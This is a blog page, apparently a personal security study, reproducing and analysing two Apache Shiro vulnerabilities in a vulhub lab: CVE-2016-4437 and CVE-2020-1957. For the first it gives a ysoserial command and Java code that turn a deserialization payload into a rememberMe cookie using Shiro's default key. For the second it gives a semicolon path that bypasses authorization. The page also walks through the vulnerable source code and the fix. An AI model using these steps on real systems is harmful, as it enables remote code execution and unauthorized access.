@@ -1,0 +1,379 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="aesm1p">
+
+
+
+    <meta name="description" content="相逢意气为君饮">
+
+
+
+<title>Shiro相关漏洞学习 | aesm1p&#39;s blog</title>
+
+
+
+    <link rel="icon" href="/a.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 6.1.0"></head>
+
+<body>
+    <script>
+        // this function is used to check current theme before page loaded.
+        (() => {
+            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
+            const isDark = currentTheme === 'dark';
+            const pagebody = document.getElementsByTagName('body')[0]
+            if (isDark) {
+                pagebody.classList.add('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
+            } else {
+                pagebody.classList.remove('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Light"
+            }
+        })();
+    </script>
+
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">aesm1p&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">aesm1p&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+            <div class="main">
+                <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "Collapse all"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "Expand all"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">Shiro相关漏洞学习</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">aesm1p</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">July 4, 2022&nbsp;&nbsp;22:49:31</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">漏洞复现</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h1 id="0x01前言"><a href="#0x01前言" class="headerlink" title="0x01前言"></a>0x01前言</h1><p>shiro是各个项目中使用非常普遍的权限控制组件，学习复盘一下相关的漏洞</p>
+<h1 id="0x02-CVE-2016-4437"><a href="#0x02-CVE-2016-4437" class="headerlink" title="0x02 CVE-2016-4437"></a>0x02 CVE-2016-4437</h1><h2 id="漏洞版本"><a href="#漏洞版本" class="headerlink" title="漏洞版本"></a>漏洞版本</h2><blockquote>
+<p>版本号&lt;1.2.5</p>
+</blockquote>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>这里使用vulhub的环境来进行复现。</p>
+<p>首先生成反序列化数据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java.exe&quot; -jar ysoserial-all.jar CommonsBeanutils1 &quot;touch /tmp/success&quot; &gt; poc.ser</span><br></pre></td></tr></table></figure>
+
+<p>然后生成cookie</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.shiro.crypto.AesCipherService;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.codec.CodecSupport;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.util.ByteSource;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.codec.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.nio.file.FileSystems;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestRemember</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] payloads = Files.readAllBytes(FileSystems.getDefault().getPath(<span class="string">&quot;C:\\Users\\aesm1p\\Downloads&quot;</span>, <span class="string">&quot;poc.ser&quot;</span>));</span><br><span class="line">        <span class="type">AesCipherService</span> <span class="variable">aes</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AesCipherService</span>();</span><br><span class="line">        <span class="type">byte</span>[] key = Base64.decode(CodecSupport.toBytes(<span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteSource</span> <span class="variable">ciphertext</span> <span class="operator">=</span> aes.encrypt(payloads, key);</span><br><span class="line">        System.out.printf(ciphertext.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>将生成的cookie复制到rememberMe字段即可触发命令执行</p>
+<img src="/2022/07/04/shiro/1.png" class="">
+
+<p>可以看到成功执行了命令</p>
+<img src="/2022/07/04/shiro/3.png" class="">
+
+<p>这里有一个坑点，如果cookie中有JSESSION字段，那么无法触发命令执行（但是后面复现发现和这个其实没有关系）</p>
+<img src="/2022/07/04/shiro/2.png" class="">
+
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>漏洞代码在<code>shiro.mgt.AbstractRememberMemanager</code>文件</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">AbstractRememberMeManager</span> <span class="keyword">implements</span> <span class="title class_">RememberMeManager</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Logger</span> <span class="variable">log</span> <span class="operator">=</span> LoggerFactory.getLogger(AbstractRememberMeManager.class);</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">byte</span>[] DEFAULT_CIPHER_KEY_BYTES = Base64.decode(<span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>); <span class="comment">//默认密钥</span></span><br><span class="line">    <span class="keyword">private</span> Serializer&lt;PrincipalCollection&gt; serializer = <span class="keyword">new</span> <span class="title class_">DefaultSerializer</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="type">CipherService</span> <span class="variable">cipherService</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AesCipherService</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="type">byte</span>[] encryptionCipherKey;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">byte</span>[] decryptionCipherKey;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">AbstractRememberMeManager</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.setCipherKey(DEFAULT_CIPHER_KEY_BYTES);  <span class="comment">//在构造函数中设置了默认密钥</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setCipherKey</span><span class="params">(<span class="type">byte</span>[] cipherKey)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.setEncryptionCipherKey(cipherKey);   </span><br><span class="line">        <span class="built_in">this</span>.setDecryptionCipherKey(cipherKey); <span class="comment">//加解密都使用了默认密钥</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里可以看到设置了默认的CipherKey密钥<code>kPH+bIxk5D2deZiIxcaaaA==</code>，在下面163行代码解密时使用了该默认密钥</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="type">byte</span>[] decrypt(<span class="type">byte</span>[] encrypted) &#123;</span><br><span class="line">    <span class="type">byte</span>[] serialized = encrypted;</span><br><span class="line">    <span class="type">CipherService</span> <span class="variable">cipherService</span> <span class="operator">=</span> <span class="built_in">this</span>.getCipherService();</span><br><span class="line">    <span class="keyword">if</span> (cipherService != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="type">ByteSource</span> <span class="variable">byteSource</span> <span class="operator">=</span> cipherService.decrypt(encrypted, <span class="built_in">this</span>.getDecryptionCipherKey());<span class="comment">//使用默认密钥解密</span></span><br><span class="line">        serialized = byteSource.getBytes();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> serialized;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里就意味着如果开发人员没有修改这么默认的密钥的话，那么我们就可以构造出任意的序列化数据，然后触发反序列化漏洞。</p>
+<h1 id="0x03-CVE-2020-1957"><a href="#0x03-CVE-2020-1957" class="headerlink" title="0x03 CVE-2020-1957"></a>0x03 CVE-2020-1957</h1><h2 id="漏洞版本-1"><a href="#漏洞版本-1" class="headerlink" title="漏洞版本"></a>漏洞版本</h2><blockquote>
+<p>版本号&lt;1.5.2</p>
+</blockquote>
+<h2 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>输入<code>/hello/admin</code>，会被重定向到登录页面，说明鉴权产生了效果</p>
+<img src="/2022/07/04/shiro/4.png" class="">
+
+<p>访问<code>/xxxx/..;/hello/admin</code>，则可以成功绕过限制访问到<code>/hello/admin</code></p>
+<img src="/2022/07/04/shiro/5.png" class="">
+
+<h2 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>这个漏洞从总体上来看是由于spring和shiro的URI匹配机制差异导致的鉴权绕过，所以我们就要一步步先分析两个的URI匹配机制。</p>
+<p>首先分析一下shiro的匹配机制，在<code>org.apache.shiro.web.util.WebUtils.java</code>中，跟进第58行的getRequestUri函数，这里对uri进行了处理</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">getRequestUri</span><span class="params">(HttpServletRequest request)</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">uri</span> <span class="operator">=</span> (String)request.getAttribute(<span class="string">&quot;javax.servlet.include.request_uri&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (uri == <span class="literal">null</span>) &#123;</span><br><span class="line">        uri = request.getRequestURI();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> normalize(decodeAndCleanUriString(request, uri));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>跟进decodeAndCleanUriString函数</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> String <span class="title function_">decodeAndCleanUriString</span><span class="params">(HttpServletRequest request, String uri)</span> &#123;</span><br><span class="line">    uri = decodeRequestString(request, uri);</span><br><span class="line">    <span class="type">int</span> <span class="variable">semicolonIndex</span> <span class="operator">=</span> uri.indexOf(<span class="number">59</span>);</span><br><span class="line">    <span class="keyword">return</span> semicolonIndex != -<span class="number">1</span> ? uri.substring(<span class="number">0</span>, semicolonIndex) : uri;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到这里的逻辑很简单，就是如果有<code>;</code>,那么uri就截断为<code>;</code>之前的路径，如果没有<code>;</code>的话，那uri就不变，所以这里uri就会由<code>/xxxx/..;/hello/admin</code>转换为<code>/xxxx/..</code>。</p>
+<p>接着继续跟进<code>normalize()</code>函数</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> String <span class="title function_">normalize</span><span class="params">(String path, <span class="type">boolean</span> replaceBackSlash)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (path == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">normalized</span> <span class="operator">=</span> path;</span><br><span class="line">        <span class="keyword">if</span> (replaceBackSlash &amp;&amp; path.indexOf(<span class="number">92</span>) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">            normalized = path.replace(<span class="string">&#x27;\\&#x27;</span>, <span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">        &#125;  <span class="comment">// 替换反斜杠为正斜杠</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (normalized.equals(<span class="string">&quot;/.&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;/&quot;</span>; </span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (!normalized.startsWith(<span class="string">&quot;/&quot;</span>)) &#123;</span><br><span class="line">                normalized = <span class="string">&quot;/&quot;</span> + normalized;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span>(<span class="literal">true</span>) &#123;</span><br><span class="line">                <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> normalized.indexOf(<span class="string">&quot;//&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span> (index &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">while</span>(<span class="literal">true</span>) &#123;</span><br><span class="line">                        index = normalized.indexOf(<span class="string">&quot;/./&quot;</span>);</span><br><span class="line">                        <span class="keyword">if</span> (index &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                            <span class="keyword">while</span>(<span class="literal">true</span>) &#123;</span><br><span class="line">                                index = normalized.indexOf(<span class="string">&quot;/../&quot;</span>);</span><br><span class="line">                                <span class="keyword">if</span> (index &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                                    <span class="keyword">return</span> normalized;</span><br><span class="line">                                &#125;</span><br><span class="line"></span><br><span class="line">                                <span class="keyword">if</span> (index == <span class="number">0</span>) &#123;</span><br><span class="line">                                    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                                &#125;</span><br><span class="line"></span><br><span class="line">                                <span class="type">int</span> <span class="variable">index2</span> <span class="operator">=</span> normalized.lastIndexOf(<span class="number">47</span>, index - <span class="number">1</span>);</span><br><span class="line">                                normalized = normalized.substring(<span class="number">0</span>, index2) + normalized.substring(index + <span class="number">3</span>);</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        normalized = normalized.substring(<span class="number">0</span>, index) + normalized.substring(index + <span class="number">2</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                normalized = normalized.substring(<span class="number">0</span>, index) + normalized.substring(index + <span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>总结一下，该函数主要进行了如下的操作：</p>
+<ul>
+<li>替换<code>\</code>为<code>/</code></li>
+<li>如果输入为<code>/.</code>，则直接返回<code>/</code></li>
+<li>如果path开头缺少<code>/</code>，那么补上开头的<code>/</code></li>
+<li>将<code>//</code>替换为<code>/</code></li>
+<li>将<code>//</code>替换为<code>/</code></li>
+<li>将<code>/../</code>替换为<code>/</code></li>
+</ul>
+<p>这里主要就是将path进行了检查和修复，以便得到正确的uri。那么接下来该uri根据shiro的规则进行匹配</p>
+<img src="/2022/07/04/shiro/11.png" class="">
+
+<p>可以看到，经过处理获取到的uri为<code>/xxxx/..</code>，那么在与我们的shiro规则进行匹配的时候，显然一个都匹配不到，所以这个请求就不会被shiro拦截</p>
+<p>接着分析spring端获取的请求URI，在<code>org.springframework.web.util.UrlPathHelper.java</code>中找到getRequestURI()函数</p>
+<img src="/2022/07/04/shiro/6.png" class="">
+
+<p>跟进decodeAndCleanUriString()函数，此时的uri还是我们传入的uri</p>
+<img src="/2022/07/04/shiro/7.png" class="">
+
+<p>removeSemicolonContent()函数的功能是移除分号，查看下具体实现</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">removeSemicolonContent</span><span class="params">(String requestUri)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.removeSemicolonContent ? <span class="built_in">this</span>.removeSemicolonContentInternal(requestUri) : <span class="built_in">this</span>.removeJsessionid(requestUri);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> String <span class="title function_">removeSemicolonContentInternal</span><span class="params">(String requestUri)</span> &#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">semicolonIndex</span> <span class="operator">=</span> requestUri.indexOf(<span class="number">59</span>); semicolonIndex != -<span class="number">1</span>; semicolonIndex = requestUri.indexOf(<span class="number">59</span>, semicolonIndex)) &#123; <span class="comment">//寻找所有的;作为起点</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">slashIndex</span> <span class="operator">=</span> requestUri.indexOf(<span class="number">47</span>, semicolonIndex); <span class="comment">// 以;为起点，寻找/符号的位置</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">start</span> <span class="operator">=</span> requestUri.substring(<span class="number">0</span>, semicolonIndex);</span><br><span class="line">        requestUri = slashIndex != -<span class="number">1</span> ? start + requestUri.substring(slashIndex) : start; <span class="comment">// 查找分号后面是否存在反斜杠，如果存在的话就去掉分号。</span></span><br><span class="line">    &#125;<span class="comment">// 按照此逻辑循环处理</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> requestUri;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到该代码实质上的功能是去掉了路径中的所有分号</p>
+<img src="/2022/07/04/shiro/8.png" class="">
+
+<p>decodeRequestString()函数根据编码方式（如UTF-8）进行解码，uri不变</p>
+<img src="/2022/07/04/shiro/9.png" class="">
+
+<p>接下来跟进getSanitizedPath(uri)函数</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> String <span class="title function_">getSanitizedPath</span><span class="params">(String path)</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">sanitized</span> <span class="operator">=</span> path;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(<span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> sanitized.indexOf(<span class="string">&quot;//&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (index &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> sanitized;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        sanitized = sanitized.substring(<span class="number">0</span>, index) + sanitized.substring(index + <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这段代码很简单，就是去除双斜杠。</p>
+<p>总结一下，这段代码主要的内容是去除分号和双斜杠。</p>
+<img src="/2022/07/04/shiro/10.png" class="">
+
+<p>所以这里pathWithinApp最终会获取到的是<code>/xxxx/../hello/admin</code></p>
+<p>servletPath获取到的是<code>/hello/admin</code>,继续跟进可以看到最终获取的是<code>/hello/admin</code></p>
+<p>所以这里漏洞就产生了，shiro在检测的时候是<code>/xxxx/..</code>，所以绕过了shiro检测，但是spring实际最终访问的确实<code>/hello/admin</code>，从而实现了绕过。</p>
+<h2 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h2><img src="/2022/07/04/shiro/12.png" class="">
+
+<p>可以看到在1.5.2版本的修复中对uri使用了新的方法赋值</p>
+<img src="/2022/07/04/shiro/13.png" class="">
+
+<p>可以看到这里获取到的的值为<code>//hello/admin</code>，在执行完<code>nomrmalize(decodeAndCleanString(request, uri))</code>，最终得到的结果为<code>/hello/admin</code>，这样就会被shiro规则匹配到。</p>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>aesm1p</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="http://example.com/2022/07/04/shiro/">http://example.com/2022/07/04/shiro/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2022 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/shiro/"># shiro</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+            
+            <a class="next" rel="next" href="/2022/06/20/ruoyi/">若依项目部分漏洞代码分析</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+            </div>
+            <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© aesm1p | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+
+</html>
